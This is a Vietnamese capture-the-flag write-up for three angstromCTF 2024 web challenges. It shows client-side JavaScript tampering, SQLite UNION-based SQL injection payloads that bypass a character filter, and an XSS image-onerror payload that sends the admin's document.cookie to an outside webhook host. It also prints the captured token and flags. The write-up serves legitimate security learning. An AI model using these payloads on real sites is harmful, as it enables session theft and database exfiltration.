# Spinner

## description 

> đây có vẻ là 1 bài liên quan đến config javascript 

![333777916-97347d0d-8125-40e8-8bd4-6beb713b3a8b](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/8e2f84d0-d0e7-42d2-bed2-fea671e2bc61)

+ đầu tiên khi vào ta đã có 1 yêu cầu sao cho phải quay đủ 10K thì ra được flag nhưng để dùng chuột quay sẽ mất nhiều t/g

![333777962-90603292-7d09-410e-99be-a9e7d1da77b2](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/ef287337-ea75-4cea-bdc9-546a9bb004dd)

+ ta sẽ check config bên js qua sources  


```
<script>
    const state = {
        dragging: false,
        value: 0,
        total: 0,
        flagged: false,
    }

    const message = async () => {
        if (state.flagged) return
        const element = document.querySelector('.message')
        element.textContent = Math.floor(state.total / 360)

        if (state.total >= 10_000 * 360) {
            state.flagged = true
            const response = await fetch('/falg', { method: 'POST' })
            element.textContent = await response.text()
        }
    }
    message()

    const draw = () => {
        const spinner = document.querySelector('.spinner')
        const degrees = state.value
        spinner.style.transform = `rotate(${degrees}deg)`
    }

    const down = () => {
        state.dragging = true
    }

    const move = (e) => {
        if (!state.dragging) return

        const spinner = document.querySelector('.spinner')
        const center = {
            x: spinner.offsetLeft + spinner.offsetWidth / 2,
            y: spinner.offsetTop + spinner.offsetHeight / 2,
        }
        const dy = e.clientY - center.y
        const dx = e.clientX - center.x
        const angle = (Math.atan2(dy, dx) * 180) / Math.PI

        const value = angle < 0 ? 360 + angle : angle
        const change = value - state.value

        if (0 < change && change < 180) state.total += change
        if (0 > change && change > -180) state.total += change
        if (change > 180) state.total -= 360 - change
        if (change < -180) state.total += 360 + change

        state.value = value

        draw()
        message()
    }

    const up = () => {
        state.dragging = false
    }

    document.querySelector('.handle').addEventListener('mousedown', down)
    window.addEventListener('mousemove', move)
    window.addEventListener('mouseup', up)
    window.addEventListener('blur', up)
    window.addEventListener('mouseleave', up)
</script>
```

+ ta nhìn vào thông tin chứa flag nhưng được viết tắt là /falg có 1 config của 1 value tên state.total là tích của số lần quay đích * với 360 vòng

+ nên có thể ta có 1 suy nghĩ về việc config state.total hiện tại là 2000000000 => console

+ vì state điều kiện là state.total >= nên ta sẽ triển khai trên console browser


payload 1: state.total = 2000000000 => 1 lần spin browser sẽ hiển thị total hiện tại vừa config ở console

![335000581-5a8331e6-769b-413b-bd5c-63d0954a7601](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/4d535eb5-baa1-4734-8020-629ff42ddcae)




payload 2 => chatgpt

```
// Function to simulate spins
const simulateSpins = async () => {
    const spins = 100000; // Change this to 100000 for 100,000 spins
    const spinner = document.querySelector('.spinner');
    const centerX = spinner.offsetLeft + spinner.offsetWidth / 2;
    const centerY = spinner.offsetTop + spinner.offsetHeight / 2;
    const angles = [0, 45, 90, 135, 180, 225, 270, 315]; // Define the angles to spin to
    const totalAngles = angles.concat(angles); // Repeat the sequence of angles

    for (let i = 0; i < spins; i++) {
        const angle = totalAngles[i % totalAngles.length];
        const radians = (angle * Math.PI) / 180;
        const randomX = centerX + Math.cos(radians) * (spinner.offsetWidth / 2);
        const randomY = centerY + Math.sin(radians) * (spinner.offsetHeight / 2);

        down();
        move({ clientX: randomX, clientY: randomY });
        up();
    }
};

// Run the simulation
simulateSpins();
```

```
// Function to simulate spins
const simulateSpins = async () => {
    const spins = 100000; // Change this to 100000 for 100,000 spins
    const spinner = document.querySelector('.spinner');
    const centerX = spinner.offsetLeft + spinner.offsetWidth / 2;
    const centerY = spinner.offsetTop + spinner.offsetHeight / 2;
    const angles = [0, 45, 90, 135, 180, 225, 270, 315]; // Define the angles to spin to
    const totalAngles = angles.concat(angles); // Repeat the sequence of angles

    // Define a function to create a delay between spins
    const spinWithDelay = async () => {
        return new Promise((resolve) => {
            setTimeout(resolve, 10); // Adjust delay time as needed
        });
    };

    for (let i = 0; i < spins; i++) {
        const angle = totalAngles[i % totalAngles.length];
        const radians = (angle * Math.PI) / 180;
        const randomX = centerX + Math.cos(radians) * (spinner.offsetWidth / 2);
        const randomY = centerY + Math.sin(radians) * (spinner.offsetHeight / 2);

        down();
        move({ clientX: randomX, clientY: randomY });
        up();

        await spinWithDelay(); // Add delay between spins
    }
};

// Run the simulation
simulateSpins();

```

![333777832-f678a7e4-4827-4955-ae63-5c1206be2467](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/b97cb73b-b353-413a-beb9-b94801bdf4c8)

flag: actf{b152d497db04fcb1fdf6f3bb64522d5e}



# challenges Store 

![334997363-26a74641-1712-469f-90bf-49b5ae64585a](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/5a9fc6cc-9a38-4b42-91b2-2b6a332cc059)

## description 

> bài này có vẻ mình tắc ở đoạn triển khai payload vào khai thác sau khi được gợi ý có vẻ vẫn chưa check được :((


## Recon

+ khi input đầu vào cho search với query là: '

![334997783-0bc2d217-83e5-4217-a0ef-35037a0c4324](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/17b3e2e3-d879-47c9-ba50-1ca5f90d2082)

+ nó có vẻ hiện thông báo như này có thể là do bị block bên javascript và có khả năng là lỗ hổng sqli

+ sau khi mở src code ta tìm được 1 dòng code chưa script tag

```
<script>
            const form = document.querySelector('form')
            form.addEventListener('submit', (event) => {
                const item = form.querySelector('input[name="item"]').value
                const allowed = new Set(
                    'abcdefghijklmnop' +
                    'qrstuvwxyzABCDEF' +
                    'GHIJKLMNOPQRSTUV' +
                    'WXYZ0123456789, '
                )
                if (item.split('').some((char) => !allowed.has(char))) {
                    alert('Invalid characters in search query.')
                    event.preventDefault()
                }
            })
        </script>
```

=> nó chỉ cho phép những ký tự trong const allowed test thêm dấu : -- 

+ kết quả trả về -- là như v cho đến khi mình mở brupsuite và test

![334998230-a199665f-7fb2-4c99-a80e-6d882e61a696](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/81159774-5b27-4a88-b3d1-0a803135ca54)

có vẻ là 1 thông tin hợp lệ 

=> rồi ta test thử payload với các kí tự thì không có gì chỉ có 1 số kí tự là trả về lỗi đơn cử là '

![334998528-7d4c721d-808b-46ad-952d-5f2eda47efc7](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/2ec5b689-f1e3-4a6e-ae82-b640ebe9a6a7)

- sau đó ta test payload

```
' OR '1'='1
```

![334998743-6c69dee3-5f8e-4c83-a25a-a75e3497a9cb](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/3a923a4e-b093-4d4c-b3e8-59fb34e782cf)

- xác định được đó là payload và có 1 vấn đề ở dấu ' ta cần bypass

+ chèn payload này thì nó đã in ra màn hình 2 value cột của database vì id che nên ta chỉ in được 2 value

```
' UNION SELECT 1,'a','null
```


- ta sẽ thiết kế 1 payload để test dần trường hợp của bài này

- ta sẽ check đây là loại sql gì bằng cách sử dụng từng payload check version check sql

```
'UNION SELECT 1, 'a' , sqlite_version() --  
```

![340616738-fa6b4161-4fa2-42a1-9bf4-c528c24b59c6](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/7a7550b9-e3e8-474d-9d16-9a8d850db840)

=> đây là sqlite 

```
'UNION SELECT 1, 'a' , tbl_name from sqlite_master --
```
=> check table name từ sqlite_master 

![340617328-08ee63de-0bbc-4263-9d87-e2e4eeabb24f](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/424db51e-717d-4174-80ec-ff4843cfac9d)


=> table = flagsf3a8206f2044853d31295a800dcf5d58

```
'UNION SELECT 1, * ,'a' from flagsf3a8206f2044853d31295a800dcf5d58 --
```

=> check các cột trên bằng * của table flag 

![340617813-a3aaa0a8-6c71-43cd-8271-0d618dffff08](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/20de95a8-533a-4b7d-8bc4-20b5a9a2f51b)



=> flag: actf{37619bbd0b81c257b70013fa1572f4ed}



# Markdown 

## description 

> đây là dạng xss cookie stealing đã có 1 bài tương tự là static-pastebin của redpwn 


![335002967-65cc1577-f544-4eec-ba72-496632b65821](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/a78222a7-a7db-41ed-8c56-a92e6b0f3116)


- ta có 2 link :

   https://markdown.web.actf.co/ => là để chèn content vào

   https://admin-bot.actf.co/markdown => là để share trên link này từ content đã được chèn

+ ta có thông tin về code index.js

```
const crypto = require('crypto')

const express = require('express')
const app = express()

const posts = new Map()

app.use(express.urlencoded({ extended: false }))

app.get('/', (_req, res) => {
    const placeholder = [
        '# Note title',
        'Content of the note. You can use *italics*!',
    ].join('\n')

    res.type('text/html').end(`
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>Pastebin</h1>
            <form action="/create" method="POST">
                <textarea name="content">${placeholder}</textarea>
                <button type="submit">Create</button>
            </form>
        </div>
    `)
})

app.get('/flag', (req, res) => {
    const cookie = req.headers.cookie ?? ''
    res.type('text/plain').end(
        cookie.includes(process.env.TOKEN)
        ? process.env.FLAG
        : 'no flag for you'
    )
})

app.get('/view/:id', (_req, res) => {
    const marked = (
        'https://cdnjs.cloudflare.com/ajax/libs/marked/4.2.2/marked.min.js'
    )

    res.type('text/html').end(`
        <link rel="stylesheet" href="/style.css">
        <div class="content">
        </div>
        <script src="${marked}"></script>
        <script>
            const content = document.querySelector('.content')
            const id = document.location.pathname.split('/').pop()

            delete (async () => {
                const response = await fetch(\`/content/\${id}\`)
                const text = await response.text()
                content.innerHTML = marked.parse(text)
            })()
        </script>
    `)
})

app.post('/create', (req, res) => {
    const data = req.body.content ?? ''
    const id = crypto.randomBytes(8).toString('hex')
    posts.set(id, data)
    res.redirect(`/view/${id}`)
})

app.get('/content/:id', (req, res) => {
    const id = req.params.id
    const data = posts.get(id) ?? ''
    res.type('text/plain').end(data)
})

app.get('/style.css', (_req, res) => {
    res.type('text/css').end(`
        * {
          font-family: system-ui, -apple-system, BlinkMacSystemFont,
            'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
          box-sizing: border-box;
        }

        html,
        body {
          margin: 0;
        }

        .content {
          padding: 2rem;
          width: 90%;
          max-width: 900px;
          margin: auto;
        }

        input:not([type='submit']) {
          width: 100%;
          padding: 8px;
          margin: 8px 0;
        }

        textarea {
          width: 100%;
          padding: 8px;
          margin: 8px 0;
          resize: vertical;
          font-family: monospace;
        }

        input[type='submit'] {
          margin-bottom: 16px;
        }


    `)
})

app.listen(3000)
```

+ ta tìm được thông tin để lấy được flag ta sẽ phải tỉm ra session token code nếu không thì sẽ in ra no flag

+ ta sẽ dùng payload xss stealing token bằng cách sử dụng 1 web để hooked data từ server  

Webhook

```
https://pipedream.com
https://webhook.site/
brupsuite.pro collaborator
```

payload webhook steal cookie

```
><img src=x onerror='fetch("<Request_url>/?q="+document.cookie);'>

<img src="x" onerror="fetch('https://eobebcvkp2ou15v.m.pipedream.net/?q=' +(document.cookie));">
```

## exploit 

+ ta sử dụng brup collaborator và payload


payload solve
```
<img src="x" onerror="fetch('https://mf507brz66qf4sksfh4a5lgi79d01p.oastify.com/?q=' +(document.cookie));">
```

![335434327-04f95e41-29a1-43e1-8878-d36995254f34](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/6a09d0e5-abda-47d8-bf84-83e9112991eb)

=> poll request từ admin bot 'token = d15453b0234690ccbb91861e'

add token in cookie editor in https://markdown.web.actf.co/flag

![335437955-3f56aba3-4d8c-4ece-8cad-1548026c38ad](https://github.com/neo-M3tinez/angstromctf_2024/assets/174318737/a32890b7-a587-45d7-9336-d7385e5832d0)

=> flag:actf{b534186fa8b28780b1fcd1e95e2a2e2c}

